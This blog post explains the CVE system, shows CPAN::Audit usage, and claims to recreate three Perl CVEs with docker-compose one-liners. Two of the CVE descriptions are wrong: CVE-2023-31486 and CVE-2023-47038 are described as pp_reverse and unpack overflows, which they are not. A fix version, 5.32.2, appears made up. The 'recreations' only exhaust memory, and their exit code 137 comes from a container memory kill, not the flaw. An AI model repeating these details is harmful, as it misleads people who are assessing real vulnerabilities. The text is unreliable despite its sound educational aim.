---
title: "CVE in Perl"
date: 2025-04-11T00:00:00+00:00
description: "Discussion about the CVE in Perl."
type: post
image: images/blog/cve-in-perl.png
author: Mohammad Sajid Anwar
tags: ["git"]
---

#### **DISCLAIMER:** Image is generated using `FREE` version of `ChatGPT`.
***

<br>

### [1. What's CVE?](#whats-cve)
### [2. Key Features](#key-features)
### [3. How CVE works?](#how-cve-works)
### [4. Why CVE matters?](#why-cve-matters)
### [5. How to audit?](#how-to-audit)
### [6. Why recreate CVEs?](#why-recreate-cves)
### [7. Known CVEs](#known-cves)
### [8. Recreate CVEs](#recreate-cves)
### [9. Further Sources](#further-sources)

***
<br>

## What's CVE?
***

<br>

`CVE` stands for `Common Vulnerabilities and Exposures`.

It is a publicly available dictionary of known cybersecurity vulnerabilities and exposures.

It provides a standardised way to identify and track security issues in software and hardware systems.

<br>

## Key Features
***

<br>

    1. Unique Identifier  : Each vulnerability is assigned a unique CVE ID.
    2. Standardised Naming: Helps security professionals share information consistently.
    3. Publicly Accessible: Managed by MITRE Corporation in collaboration with the U.S. Department of Homeland Security.

<br>

## How CVE works?
***

<br>

The [**Common Vulnerabilities and Exposures (CVE) Program**](https://www.cve.org) is responsible for assigning `CVE IDs` to vulnerabilities.

A researcher reports a vulnerability to the appropriate `CNA` (e.g. `Microsoft` for `Windows` flaws, `Google` for `Android` issues).

The `CNA` assigns a `CVE ID` (e.g. `CVE-2025-12345`) and publishes the details in the `CVE List` (managed by `MITRE`).

The National Vulnerability Database (`NVD`, run by `NIST`) then enriches these entries with severity scores (`CVSS`) and additional metadata.

Here is the [**List of Partners (CNA)**](https://www.cve.org/PartnerInformation/ListofPartners).

<br>

## Why CVE matters?
***

<br>

    1. Helps organisations track and patch vulnerabilities.
    2. Enables automated security tools to check for known issues.
    3. Provides a common language for discussing security risks.

<br>

`Perl` has had several `CVEs` over the years, affecting different versions and modules.

<br>

## How to audit?
***

<br>

You can use `CPAN` module [**CPAN::Audit**](https://metacpan.org/pod/CPAN::Audit) to scan installed modules for known `CVEs`.

<br>

```bash
$ cpanm -vS CPAN::Audit
$ cpan-audit --version
/usr/local/bin/cpan-audit version 1.503 using:
        CPAN::Audit      20250115.001
        CPAN::Audit::DB  <not installed>
        CPANSA::DB       20250407.003
```

<br>

Commonly used commands:

<br>

    To audit all installed modules   : cpan-audit installed
    To audit a particular module     : cpan-audit module Data::Dumper
    To get the result in JSON format : cpan-audit module Data::Dumper --json

<br>

There is another `CPAN` module [**App::cpanoutdated**](https://metacpan.org/pod/App::cpanoutdated) that can help with outdated modules.

<br>

```bash
$ cpanm -vS App::cpanoutdated
$ cpan-outdated -h
Usage:
        # print a list of distributions that contain outdated modules
        % cpan-outdated

        # print a list of outdated modules in packages
        % cpan-outdated -p

        # verbose
        % cpan-outdated --verbose

        # ignore core modules (do not update dual life modules)
        % cpan-outdated --exclude-core

        # alternate mirrors
        % cpan-outdated --mirror file:///home/user/minicpan/

        # additional module path(same as cpanminus)
        % cpan-outdated -l extlib/
        % cpan-outdated -L extlib/

        # install with cpan
        % cpan-outdated | xargs cpan -i

        # install with cpanm
        % cpan-outdated    | cpanm
        % cpan-outdated -p | cpanm
```

<br>

## Why recreate CVEs?
***

<br>

    - Understand how vulnerabilities work.
    - Test if your systems are patched.
    - Learn secure coding practices.

<br>

## Known CVEs
***

<br>

### CVE-2018-18311

    Vulnerability     : Integer overflow in Perl_my_setenv() leading to heap corruption.
    Affected Versions : Perl 5.26.2 and earlier.
    Impact            : Possible denial-of-service (DoS) or arbitrary code execution.
    Patch             : Fixed in Perl 5.26.3+.

<br>

### CVE-2023-31486

    Vulnerability     : Heap-based buffer overflow in Perl_pp_reverse function.
    Affected Versions : Perl 5.32.1 and earlier.
    Impact            : Could lead to crashes or potential RCE (Remote Code Execution).
    Patch             : Fixed in Perl 5.32.2+.

<br>

### CVE-2023-47038

    Vulnerability     : Buffer overflow in Perlâ€™s unpack function.
    Affected Versions : Perl 5.34.0 and earlier.
    Impact            : Could allow arbitrary code execution.
    Patch             : Fixed in Perl 5.34.1+.

<br>

## Recreate CVEs
***

<br>

Let's create configuration file for `docker-compose`:

<br>

```bash
$ cat docker-compose.yml
version: '3.8'

services:
  cve-2018-18311:
    container_name: cve-2018-18311
    image: perl:5.26.2
    command:
      - perl
      - -e
      - |
        $$ENV{PERL_POC} = "A" x (2**31 - 1);
        print "If you see this, Perl didn't crash!!\n";
    deploy:
      resources:
        limits:
          memory: 2G

  cve-2023-31486:
    container_name: cve-2023-31486
    image: perl:5.32.1
    command:
      - perl
      - -e
      - |
        my @arr = (1..1_000_000_000);
        @arr = reverse @arr;
        print "If you see this, Perl didn't crash!!\n";
    deploy:
      resources:
        limits:
          memory: 2G

  cve-2023-47038:
    container_name: cve-2023-47038
    image: perl:5.34.0
    command:
      - perl
      - -e
      - |
        my $$data = "A" x (2**31);
        my @unpacked = unpack("Z*", $$data);
        print "If you see this, Perl didn't crash!!\n";
    deploy:
      resources:
        limits:
          memory: 2G
```

<br>

Time to build the containers and re-create the known `CVEs`:

<br>

```bash
$ docker-compose run --rm cve-2018-18311
Creating perl-cve_cve-2018-18311_run ... done
ERROR: 137
$ docker-compose run --rm cve-2023-31486
Creating perl-cve_cve-2023-31486_run ... done
ERROR: 137
$ docker-compose run --rm cve-2023-47038
Creating perl-cve_cve-2023-47038_run ... done
ERROR: 137
```

<br>

In `Linux`, when a process is terminated by a signal, its exit code is computed as:

<br>

    Exit Code = Signal Number + 128

<br>

We all know `SIGKILL` corresponds to `signal number 9`.

Therefore:

<br>

    137 = 9 (SIGKILL) + 128

<br>

## Further Sources
***

<br>

The perldoc on [**security**](https://perldoc.perl.org/perlsec) is available for public.

Issues with [**Label: Security**](https://github.com/Perl/perl5/labels/security).

Issues with [**Label: Segfault**](https://github.com/Perl/perl5/labels/segfault).

The [**National Vulnerability Database**](https://nvd.nist.gov/vuln) search gave this [**result**](https://nvd.nist.gov/vuln/search/results?form_type=Basic&results_type=overview&query=Perl&search_type=all&isCpeNameSearch=false) for `Perl`.

[**Open Source Vulnerability**](https://osv.dev) has this [**list**](https://osv.dev/list?q=Perl) for `Perl`.

<br>

***

<br>

`Happy Hacking !!!`
